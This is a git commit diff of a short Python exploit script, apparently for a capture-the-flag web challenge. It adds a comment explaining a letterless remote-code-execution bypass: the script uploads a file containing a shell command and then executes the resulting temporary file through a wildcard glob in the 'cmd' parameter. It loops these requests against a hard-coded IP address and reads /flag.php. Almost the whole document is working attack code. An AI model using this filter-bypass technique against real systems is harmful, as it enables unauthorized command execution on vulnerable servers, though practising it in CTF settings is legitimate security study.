2ec3758bdf732168e4501539f8fbdb7880fd3952
lshigurel <897084799@qq.com>
2024-10-21 11:01:07 +0800

    [web]更新exp

--- web/rce/无字母rce.py
+++ web/rce/无字母rce.py
@@ -1,5 +1,6 @@
 import requests
 
+# POST生成临时文件，然后读取临时文件来进行rce
 while True:
     url = "http://122.51.52.109:7001/rce8/?cmd=.+/???/????????[@-[]"
     r = requests.post(url, files={"file": ('feng.txt', b'cat /flag.php')})
